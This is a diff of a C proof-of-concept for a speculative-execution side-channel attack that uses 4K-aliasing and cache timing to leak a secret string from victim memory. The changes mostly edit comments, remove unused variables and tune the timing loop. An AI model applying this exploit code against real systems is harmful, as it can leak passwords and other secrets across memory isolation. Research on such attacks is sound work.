@@ -28,36 +28,17 @@ Victim code.
 unsigned int array1_size = 2048;
 uint64_t times[4096];
 uint8_t unused1[64];
-uint8_t array1[2048] = {
-  1,
-  2,
-  3,
-  4,
-  5,
-  6,
-  7,
-  8,
-  9,
-  10,
-  11,
-  12,
-  13,
-  14,
-  15,
-  16
-};
+//array1 the attacker does not have access.
+uint8_t array1[2048];
 uint8_t unused2[64];
-
-//array3 the attacker has access to and will be used for the cache side-channel
+//array2 the attacker has access to and will be used for the cache side-channel.
 uint8_t array2[256 * 512];
 uint8_t unused3[64];
-//array3 the attacker has access to and will be used for 4k Aliasing.
+//array3 the attacker has access to and will be used for 4k-aliasing.
 __attribute__((aligned(4096))) uint8_t array3[2048];
 uint8_t unused4[64];
-//Array4 the attacker has access to and will be used to get array1 offset exploiting a time channel.
+//array4 the attacker has access to and will be used to get array1 offset exploiting a time channel.
 __attribute__((aligned(4096))) char array4[4096];
-
-
 
 
 char* secret = "The password is rootkea" ;
@@ -77,12 +58,12 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int offs
   uint8_t* diverted_array3 = array3+offset;
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
-  size_t x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
   for (i = 0; i < 256; i++)
     results[i] = 0;
+
   for (tries = 999; tries > 0; tries--) {
 
     /* Flush array2[256*(0..255)] from cache */
@@ -91,6 +72,9 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int offs
 
       /* Call the victim! */
       victim_function(malicious_x);
+      /*We assume store2load happens here from `array1` store in `victim_function`.
+      to `diverted_array3` which is aligned with `array1` and holds the same
+      offset*/
 
       junk = array2[512*diverted_array3[malicious_x]];
 
@@ -130,7 +114,6 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 	static int results[4096];
 	int tries, i, j, k,junk=0;
 	register uint64_t time1, time2;
-	volatile uint8_t* addr;
 
 	for (i = 0; i < 256; i++) {
 		results[i] = 0;
@@ -141,11 +124,13 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 		for (i = 0; i < 4096; i++) {
 			times[i] = 0;
 		}
-	
+
+        //Go through all possible offsests i \in (0...4095)
 		for (i = 0; i < 4096; i++) {
 			
 			time1 = __rdtscp(&junk); /* READ TIMER */
-			for (register int j = 0; j < 8192; ++j) {
+            // 9K yielded good accuracy when experimenting
+			for (register int j = 0; j < 9000; ++j) {
 
 
 				/* Call the victim! */
@@ -159,7 +144,7 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 			times[i] += time2;
 		}
 
-		/* Increment highest access time offset.*/
+		/* Increment the highest access time offset.*/
 		uint64_t max_time = 0;
 		for (i = 0; i < 4096; i++) {
 			if (times[i] > max_time) {
